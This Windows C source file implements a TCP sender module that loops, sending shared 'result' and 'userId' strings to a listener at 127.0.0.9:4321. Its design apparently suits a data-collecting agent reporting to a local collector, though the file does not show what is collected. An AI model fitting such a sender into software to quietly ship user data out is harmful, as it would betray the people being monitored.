#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include "sender/sender.h"
#include "utils/mutex/mutex-handler.h"


void initSocketClient(void* param) {
    HANDLE hMutex = (HANDLE)param;
    WSADATA wsaData;
    SOCKET clientSocket = INVALID_SOCKET;
    int socketResult = 0;
    BOOL wsaInitialized = FALSE;

    socketResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (socketResult != 0) {
        goto CLEANUP;
    }
    wsaInitialized = TRUE;

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        goto CLEANUP;
    }

    struct sockaddr_in clientAddress;
    clientAddress.sin_family = AF_INET;
    clientAddress.sin_port = htons(4321); 
    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");

    socketResult = connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress));
    if (socketResult == SOCKET_ERROR) {
        goto CLEANUP;
    }

    send_(clientSocket, socketResult, hMutex);

CLEANUP:
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }
    if (wsaInitialized) {
        WSACleanup();
    }
    exit(0);
}

char* prepareMessage(DWORD* outSize) {
    if (!result || !userId) return NULL;

    DWORD resultLen = (DWORD)strlen(result);
    DWORD userIdLen = (DWORD)strlen(userId);
    DWORD totalSize = 2 * sizeof(DWORD) + resultLen + userIdLen;

    char* buffer = malloc(totalSize);
    if (!buffer) return NULL;

    memcpy(buffer, &resultLen, sizeof(DWORD));
    memcpy(buffer + sizeof(DWORD), &userIdLen, sizeof(DWORD));
    memcpy(buffer + 2 * sizeof(DWORD), result, resultLen);
    memcpy(buffer + 2 * sizeof(DWORD) + resultLen, userId, userIdLen);

    if (outSize) *outSize = totalSize;

    return buffer;
}

void send_(SOCKET clientSocket, int socketResult, HANDLE hMutex) {
    int retries = 0;
    int max_retries = 20;
    time_t wait_time = 5;
    const time_t max_wait_time = 16;

    while (retries < max_retries) {
        lockMutex(hMutex);
        if (result == NULL || strlen(result) == 0) {
            unlockMutex(hMutex);
            Sleep(wait_time);
            continue;
        }

        DWORD totalSize;
        char* buffer = prepareMessage(&totalSize);
        unlockMutex(hMutex);

        if (!buffer) break;

        if (send(clientSocket, buffer, totalSize, 0) == SOCKET_ERROR) {
            retries++;
            if (retries >= max_retries) {
                break;
            }
            wait_time = (wait_time * 2 > max_wait_time) ? max_wait_time : wait_time * 2;
        }
        free(buffer);

        lockMutex(hMutex);
        result[0] = '\0';
        unlockMutex(hMutex);

        retries = 0;
        wait_time = 5;
        Sleep(100);
    }
    
    NtClose(hMutex);
    closesocket(clientSocket);
    WSACleanup();
    exit(0);
}
